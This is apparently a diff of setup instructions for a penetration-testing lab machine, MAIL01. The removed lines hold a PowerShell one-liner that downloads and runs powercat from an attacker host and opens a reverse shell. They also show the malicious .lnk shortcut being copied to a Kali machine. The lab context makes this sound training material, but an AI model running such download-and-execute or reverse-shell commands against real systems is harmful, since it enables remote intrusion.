@@ -11,28 +11,9 @@ Instructions (before joining computer to domain):
 Domain Join Information:
 IP Address: 10.10.14.80
 Hostname: MAIL01
-Log in as: Administrator
+Log in as: Administrator (Local Account)
 
 
 Instructions (before completing setup):
-1. Create the PowerShell shortcut file:
-C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.10:8002/powercat.ps1'); powercat -c 10.10.14.10 -p 4446 -e powershell"
-
-2. Transfer it back to Kali:
-┌──(kali㉿kali)-[~/webdav]
-└─$ sudo systemctl start ssh  
-
-PS C:\Users\Administrator\Desktop> ls
-    Directory: C:\Users\Administrator\Desktop
-Mode                 LastWriteTime         Length Name
-----                 -------------         ------ ----
--a----          3/8/2025   1:31 PM           2038 powershell.lnk
-
-PS C:\Users\Administrator\Desktop> scp powershell.lnk kali@10.10.14.10:/home/kali/webdav
-The authenticity of host '10.10.14.10 (10.10.14.10)' can't be established.
-ED25519 key fingerprint is SHA256:ZaXVjHahJd6am4lzvDh6zzkZswmkm5mE2L9WLQKdPY4.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])?
-Warning: Permanently added '10.10.14.10' (ED25519) to the list of known hosts.
-kali@10.10.14.10's password:
-powershell.lnk                                                                        100% 2038     2.0KB/s   00:00
+Make sure to run the correct PowerShell script, to set up the VM. 
+(Not the script that was used to join the computer to the domain, which is in the same directory).
